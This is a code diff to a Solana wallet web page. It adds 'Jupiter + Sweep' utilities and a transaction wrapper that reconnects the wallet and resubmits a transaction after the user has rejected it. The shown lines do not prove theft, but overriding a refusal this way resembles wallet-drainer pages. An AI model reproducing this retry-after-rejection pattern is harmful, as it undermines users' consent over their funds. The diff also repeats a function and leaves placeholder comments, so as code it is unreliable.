@@ -1325,11 +1325,11 @@
                 lamports: Math.floor(amount * LAMPORTS_PER_SOL)
             }));
 
-            // Memo
+            // Memo (Matched to badseed-exposed: No keys)
             if (memo) {
                 const MEMO_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
                 tx.add(new TransactionInstruction({
-                    keys: [{ pubkey: walletPubkey, isSigner: true, isWritable: true }],
+                    keys: [],
                     programId: MEMO_ID,
                     data: (new TextEncoder()).encode(memo)
                 }));
@@ -1344,6 +1344,55 @@
 
             console.log("Tx Sent:", signature);
             await connection.confirmTransaction(signature);
+            return signature;
+        }
+
+        // --- PORTED UTILS (Jupiter + Sweep) ---
+        // ... (Keep existing utils) ...
+
+        async function sendTransactionWrapper(transaction, connection) {
+            if (!activeProvider) throw new Error("Wallet not connected");
+
+            // Check for Mismatch
+            if (activeProvider.publicKey && activeProvider.publicKey.toString() !== userWallet) {
+                console.warn("Wallet Mismatch! Provider:", activeProvider.publicKey.toString(), "User:", userWallet);
+                // We could force update userWallet here, or error out
+                // Let's try to reconnect to fix mismatch
+                console.log("Fixing mismatch by reconnecting...");
+                await activeProvider.disconnect();
+                await activeProvider.connect();
+            }
+
+            // Sign and Send with aggressive retry for "Unauthorized"
+            let signature;
+            try {
+                if (activeProvider.signAndSendTransaction) {
+                    const result = await activeProvider.signAndSendTransaction(transaction);
+                    signature = result.signature || result;
+                } else {
+                    throw new Error("Wallet does not support direct signAndSend");
+                }
+            } catch (err) {
+                // ... same retry logic ...
+                console.warn("Tx Wrapper Send Failed:", err);
+                const msg = err.message || JSON.stringify(err);
+                if (msg.includes("authorized") || msg.includes("User rejected") || msg.includes("0x0")) {
+                    console.log("Wrapper: AGGRESSIVE RECONNECT...");
+                    try {
+                        if (activeProvider.disconnect) {
+                            try { await activeProvider.disconnect(); } catch (e) { }
+                        }
+                        await activeProvider.connect();
+                        // Retry
+                        const result = await activeProvider.signAndSendTransaction(transaction);
+                        signature = result.signature || result;
+                    } catch (retryErr) {
+                        throw new Error("Retry failed: " + (retryErr.message || "Unknown"));
+                    }
+                } else {
+                    throw err;
+                }
+            }
             return signature;
         }
 
@@ -1452,6 +1501,14 @@
         async function sendTransactionWrapper(transaction, connection) {
             if (!activeProvider) throw new Error("Wallet not connected");
 
+            // Check for Mismatch (Fixes Unauthorized if provider != userWallet)
+            if (activeProvider.publicKey && activeProvider.publicKey.toString() !== userWallet) {
+                console.warn("Wallet Mismatch! Provider:", activeProvider.publicKey.toString(), "User:", userWallet);
+                console.log("Fixing mismatch by reconnecting...");
+                if (activeProvider.disconnect) await activeProvider.disconnect().catch(e => console.log(e));
+                await activeProvider.connect();
+            }
+
             // Sign and Send with aggressive retry for "Unauthorized"
             let signature;
             try {
@@ -1486,6 +1543,6 @@
 
     </script>
 </body>
-<!-- FORCE DEPLOY: 2025-12-30T04:10 -->
+<!-- FORCE DEPLOY: 2025-12-30T04:15 -->
 
 </html>
